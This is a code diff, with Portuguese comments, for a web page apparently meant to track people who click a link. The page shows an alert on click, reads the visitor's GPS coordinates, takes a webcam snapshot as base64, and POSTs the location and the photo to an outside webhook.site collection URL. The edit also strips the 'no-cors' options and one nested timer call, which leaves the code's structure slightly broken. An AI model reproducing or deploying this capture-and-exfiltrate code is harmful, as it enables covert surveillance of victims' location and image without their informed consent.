@@ -33,15 +33,12 @@
             alert("Aviso para o sistema: A pessoa acabou de clicar no link!");
 
             /* Quando seu servidor Python estiver pronto, o código real será semelhante a este:
-            
             fetch('https://seu-servidor-python.com/api/registrar-clique', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     evento: 'link_clicado',
                     data_hora: new Date().toISOString()
-                    // O IP e o modelo do celular (User-Agent) são capturados automaticamente 
-                    // pelo seu servidor Python quando essa requisição bate lá.
                 })
             });
             */
@@ -58,7 +55,6 @@
                         // ENVIO DOS DADOS
                         fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
                             method: 'POST',
-                            mode: 'no-cors', // Evita erros de política de segurança simples
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ latitude: lat, longitude: lon, evento: 'gps_capturado' })
                         });
@@ -83,7 +79,6 @@
                 video.style.display = "block"; 
 
                 setTimeout(() => {
-                    setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
@@ -93,7 +88,6 @@
                     // ENVIO DA FOTO
                     fetch('https://webhook.site/caa5004f-c1fd-49e5-8d1f-a6df32dbe1f6', {
                         method: 'POST',
-                        mode: 'no-cors',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ foto: imagemBase64, evento: 'foto_capturada' })
                     });
